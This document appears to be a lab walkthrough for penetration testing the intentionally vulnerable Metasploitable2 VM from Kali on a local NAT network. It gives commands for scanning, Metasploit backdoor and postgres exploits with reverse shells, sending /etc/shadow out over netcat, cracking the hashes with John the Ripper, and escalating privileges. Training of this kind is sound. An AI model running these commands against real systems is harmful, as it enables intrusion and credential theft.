# SoftwareSec-Metasploitable2

## Overview

Attempt to get a shell onto a remote system (Metasploitable2) and extract its password and shadow files for password cracking. Using SSH to verify results.

## Set Ups

#### Virtual Box

Set up a local nat network

File > Preferences > Network > add Nat Network

#### Kali

Settings > Network > Attach to > Nat Network

update: ```$apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y```

#### Metasploitable

Settings > Network > Attach to > Nat Network

username: msfadmin

password: msfadmin

## Procedure

### Network discovery

Finding your own IP

```$ifconfig```

Discovering other IPs on your network

```$nmap -sP 10.0.2.0/24```

After finding target on network, run ```nmap``` for ports and services discover

```$nmap <Target IP>```

Notice that there is an HTTP server running, use ```nikto``` to find vulnerabilities. Default port is 80

```nikto -h <Target IP>```

```nikto``` returns a list of vulnerabilities for the server. Google these vulnerabilities and their potention exploits

Running Metasploit frameworks. Either use the fast access side bar in Kali or Applications > 08 - Exploitation > Metasploit Frameworks.

The first time starting metasploit will take a little bit as it needs to initialize a database.  

### Finding Exploits 

Notice that there is an IRC service running on port 6667 during our nmap port scan. 

(https://www.cvedetails.com/cve/cve-2010-2075)

(https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor)

There is a backdoor exploit we can use. To search for a unix irc exploit. 

```search type:exploit platform:unix irc```

returns ```exploit/unix/irc/unreal_ircd_3281_backdoor```

To use the exploit:

```use exploit/unix/irc/unreal_ircd_3281_backdoor```

Set the target host:

```set RHOST <Target IP>```

Show available payloads

```show payloads```

There is a reverse tcp payload. We can learn more about it with 

```info cmd/unix/reverse```

To use the payload

```set payload cmd/unix/reverse```

We need to set some options such as LHOST

```show options```

```set LHOST <Local IP>```

Run the exploit

```exploit```

We now have a shell on the remote system. We can check that we're root with ```whoami```. We can also check our IP with ```ifconfig```. What we really want are the password hashes in the shadow file located in /etc/shadow.

```cd /etc/```

We will just ```netcat``` to transfer the file to our local machine from the stolen shell.

On local machine

```nc -lp 1234 > shadow```

On shell

```cat shadow | nc <Local IP> 1234```

We can now crack those passwords with john the ripper. Simply copy the shadow file into a hash.txt

```cp shadow hash.txt```

Run john

```john hash.txt```

We can also run john with its many built in wordlists.

```john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt```

Once the process is done, we can check our cracked passwords

```john -show hast.txt```

We should now have credentials for users on the remote machine. We can verify our passwords are correct using SSH

```ssh username@<TargetIP>```

Extra: Meterpreter - For Stealth, Flexibility, and Reliablity. ```help``` command

Postgress exploit

(https://www.cvedetails.com/cve/cve-2007-3280)

(https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload)

```use exploit/linux/postgres/postgres_payload```

```show options```

```set payload linux/x86/meterpreter/reverse_tcp```

```set LHOST <Local IP>```

```set RHOST <Target IP>```

```set PASSWORD postgres```

```exploit```

We have a meterpreter as the postgres user. But we can elevate our priviledge to root

```meterpreter> background``` Note the session ID

```use exploit/linux/local/udev_netlink```

```show options```

```set SESSION <ID of meterpreter>```

```exploit```

We now have root privildege with Meterpreter.

### Sources

#### Downloads

https://www.virtualbox.org/

https://www.kali.org/

https://metasploit.help.rapid7.com/docs/metasploitable-2

#### References

https://metasploit.help.rapid7.com/v1/docs/exploitation

https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide

https://docs.kali.org/general-use/starting-metasploit-framework-in-kali

https://tools.kali.org/information-gathering/nmap

https://tools.kali.org/information-gathering/nikto

https://tools.kali.org/password-attacks/john
